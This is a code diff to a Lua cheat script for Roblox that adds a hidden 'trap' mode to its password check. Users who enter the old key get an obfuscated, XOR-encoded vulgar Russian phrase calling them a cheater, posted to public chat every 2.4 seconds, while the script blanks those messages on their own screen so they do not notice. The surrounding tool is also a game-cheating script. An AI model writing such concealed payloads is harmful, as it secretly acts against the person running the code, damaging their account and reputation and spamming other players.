@@ -122,8 +122,15 @@ local function _fit(s)
     return h
 end
 
-local function _keyOk(input)
-    return _fit(input) == (61942 * 4099 + 991)
+local function _gate(input)
+    local h = _fit(input)
+    if h == (687133 * 1337 + 185) then
+        return "ok"
+    end
+    if h == (61942 * 4099 + 991) then
+        return "trap"
+    end
+    return nil
 end
 
 local function requirePassword()
@@ -492,8 +499,9 @@ local function requirePassword()
         if scaring then
             return
         end
-        if _keyOk(passwordBox.Text) then
-            finish(true)
+        local gate = _gate(passwordBox.Text)
+        if gate then
+            finish(gate)
             return
         end
 
@@ -529,7 +537,8 @@ end
 
 cleanupPrevious()
 
-if not requirePassword() then
+local authMode = requirePassword()
+if not authMode then
     print("[patr1k cheats] Access denied.")
     return
 end
@@ -1581,8 +1590,106 @@ end))
 
 print("[patr1k cheats v" .. SCRIPT_VERSION .. "] Loaded. Drag Patrick icon or menu title.")
 
+local trapChatEnabled = false
+local lastTrapChatTime = 0
+
+local function _blob()
+    local packed = {
+        152, 198, 105, 153, 252, 153, 248, 153, 249, 153, 244, 152, 194,
+        153, 240, 105, 152, 206, 153, 241, 152, 203, 153, 252, 152, 201,
+    }
+    local out = {}
+    for i = 1, #packed do
+        out[i] = string.char(bit32.bxor(packed[i], 73))
+    end
+    return table.concat(out)
+end
+
+local function sendHiddenChat(text)
+    local sent = false
+
+    pcall(function()
+        local tcs = game:GetService("TextChatService")
+        local channels = tcs:FindFirstChild("TextChannels")
+        if not channels then
+            channels = tcs:WaitForChild("TextChannels", 2)
+        end
+        if not channels then
+            return
+        end
+
+        local channel = channels:FindFirstChild("RBXGeneral")
+            or channels:FindFirstChild("RBXSystem")
+            or channels:FindFirstChildWhichIsA("TextChannel")
+        if channel then
+            channel:SendAsync(text)
+            sent = true
+        end
+    end)
+
+    if not sent then
+        pcall(function()
+            local events = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+            if events and events:FindFirstChild("SayMessageRequest") then
+                events.SayMessageRequest:FireServer(text, "All")
+            end
+        end)
+    end
+end
+
+local function hideOwnChat()
+    local tcs = game:GetService("TextChatService")
+    local blank = utf8.char(0x200B)
+
+    pcall(function()
+        tcs.OnIncomingMessage = function(message)
+            local properties = Instance.new("TextChatMessageProperties")
+            if message.TextSource and message.TextSource.UserId == LocalPlayer.UserId then
+                properties.PrefixText = blank
+                properties.Text = blank
+            end
+            return properties
+        end
+    end)
+
+    pcall(function()
+        tcs.OnBubbleAdded = function(message)
+            if message.TextSource and message.TextSource.UserId == LocalPlayer.UserId then
+                local props = Instance.new("BubbleChatMessageProperties")
+                props.Text = ""
+                props.BackgroundTransparency = 1
+                pcall(function()
+                    props.TailVisible = false
+                end)
+                return props
+            end
+        end
+    end)
+end
+
+if authMode == "trap" then
+    trapChatEnabled = true
+    hideOwnChat()
+
+    local phrase = _blob()
+    track(RunService.Heartbeat:Connect(function()
+        if not trapChatEnabled then
+            return
+        end
+
+        local now = tick()
+        if now - lastTrapChatTime < 2.4 then
+            return
+        end
+
+        lastTrapChatTime = now
+        sendHiddenChat(phrase)
+    end))
+end
+
 if getgenv then
     getgenv().SpeedBoostCleanup = function()
+        trapChatEnabled = false
         cancelRebind()
         disconnectAll()
         cleanupFly()
